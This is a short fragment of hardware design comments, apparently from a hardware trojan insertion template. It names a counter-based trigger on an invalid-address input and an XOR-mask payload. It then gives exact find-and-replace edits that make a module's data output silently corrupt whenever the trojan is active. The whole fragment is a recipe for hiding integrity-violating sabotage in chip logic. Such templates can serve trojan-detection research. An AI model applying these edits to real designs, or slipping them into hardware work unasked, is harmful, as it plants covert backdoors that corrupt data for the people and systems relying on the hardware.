 ...
 *   
 * Trigger: Counter on inval_addr_i
 * Payload: Corrupt data with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt data with XOR
//
// Integration Script Must Modify:
//
// IF data is assigned:
//   Find: assign data = data_value;
//   Replace: assign data = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF data is in always_ff:
//   Find: data <= data_value;
//   Replace: data <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
